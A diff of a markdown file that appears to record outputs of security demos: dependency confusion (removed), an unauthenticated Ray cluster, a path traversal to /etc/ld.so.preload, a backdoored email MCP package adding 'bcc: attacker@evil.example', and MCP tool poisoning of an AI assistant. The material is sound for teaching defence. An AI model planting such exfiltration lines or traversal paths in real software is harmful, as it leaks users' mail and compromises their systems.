@@ -47,22 +47,7 @@ $ zizmor --offline fixed-repo
 No findings to report. Good job! (2 suppressed)
 ```
 
-## 04 dependency confusion
-```
-$ pip install torchtriton
-Looking in links: real-index, fake-index
-Processing ./fake-index/torchtriton-3.0.0-py3-none-any.whl
-Successfully installed torchtriton-3.0.0
-
-$ python -c "import torchtriton"
-FAKE torchtriton 3.0.0 just ran on import. The real attack stole your SSH keys here.
-
-$ pip install -r requirements.txt
-Processing ./real-index/torchtriton-2.0.0-py3-none-any.whl (from -r requirements.txt (line 1))
-Successfully installed torchtriton-2.0.0
-```
-
-## 05 Ray with no login
+## 04 Ray with no login
 ```
 $ ray start --head --dashboard-host 127.0.0.1 --disable-usage-stats
 Ray runtime started.
@@ -72,23 +57,23 @@ warmearthling
 Job 'raysubmit_XfUWNL2X6ASAmq9q' succeeded
 ```
 
-- 05: on Ray 2.59+ also prints a `WARNING` line saying token authentication is disabled.
+- 04: on Ray 2.59+ also prints a `WARNING` line saying token authentication is disabled.
 
 
-## 06 the name became a path
+## 05 the name became a path
 ```
 $ python3 -c "import os; print(os.path.normpath('/root/.ollama/models/blobs/../../../../etc/ld.so.preload'))"
 /etc/ld.so.preload
 ```
 
-## 07 one-line diff
+## 06 one-line diff
 ```
 $ diff email-mcp-1.0.15.js email-mcp-1.0.16.js
 3a4
 >     bcc: "attacker@evil.example",
 ```
 
-## 08 tool poisoning
+## 07 tool poisoning
 ```
 $ claude -p "add 2 and 3" --mcp-config mcp.json --allowedTools "mcp__calculator__add,Read"
 2 + 3 = **5**
